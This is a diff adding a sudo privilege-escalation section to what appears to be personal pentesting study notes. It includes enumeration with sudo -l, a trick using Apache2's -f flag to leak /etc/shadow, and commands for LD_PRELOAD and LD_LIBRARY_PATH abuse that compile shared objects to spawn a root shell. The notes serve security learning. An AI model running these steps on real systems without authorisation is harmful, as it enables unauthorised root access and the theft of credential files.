@@ -180,3 +180,62 @@ perl linux-exploit-suggester-2.pl
 
 </div></div>
 
+## Sudo -l
+```bash
+sudo -l
+```
+
+to check another user
+```shell
+sudo -l -U tracy
+```
+### Shell Escape Sequences
+- [https://gtfobins.github.io/](https://gtfobins.github.io/)
+- [[Hacking Ético y Pentesting/sudo -l\|sudo -l]]
+### Leverage application functions
+- Some applications will not have a known exploit within this context.
+- we can use a "hack" to leak information **leveraging a function of the application.**
+
+Example: Apache2 ant the `-f` parameter used to load the `/etc/shadow`, this will result in an error message that includes the first line of the `/etc/shadow` file.
+### 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+- Sudo can be configured to **inherit** certain environment **variables from the user**'s environment.
+- Check which environment variables are inherited (look for the env_keep options):
+```shell
+sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+```
+- LD_PRELOAD and LD_LIBRARY_PATH are both **inherited from the user's environment**.
+- LD_PRELOAD loads a shared object before any others when a program is run.
+- LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
+### LD_PRELOAD
+- Create a shared object using the code located at /home/user/tools/sudo/[[preload.c\|preload.c]]:
+```shell
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+```
+- Run one program (listed when running **sudo -l**), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
+- A root shell should spawn.
+```shell
+sudo LD_PRELOAD=/tmp/preload.so program-name-here
+```
+### LD_LIBRARY_PATH
+Run ldd against the apache2 program file to see which shared libraries are used by the program:
+```shell
+ldd /usr/sbin/apache2
+```
+
+Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/[[library_path.c\|library_path.c]]:
+```shell
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+```
+
+Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp
+```shell
+sudo LD_LIBRARY_PATH=/tmp apache2
+```
+
+</div></div>
